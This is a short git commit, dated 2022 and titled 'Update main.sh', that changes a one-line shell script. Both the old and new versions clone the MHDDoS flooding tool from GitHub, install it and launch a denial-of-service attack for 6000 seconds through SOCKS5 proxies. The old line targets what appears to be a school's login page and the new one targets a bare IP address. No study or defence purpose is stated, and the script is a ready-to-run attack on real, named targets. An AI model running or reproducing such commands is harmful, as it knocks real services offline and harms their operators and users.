a5446dd23f6e5ce2dde24c6a6e480f7883965bfe
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-05-10 14:53:00 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,1 +1,1 @@
-rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://history-reading-award.iclass.hk/login'  5  1000 socks5.txt  100 6000
+rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py bypass  'https://52.114.76.75'  5  1000 socks5.txt  100 6000
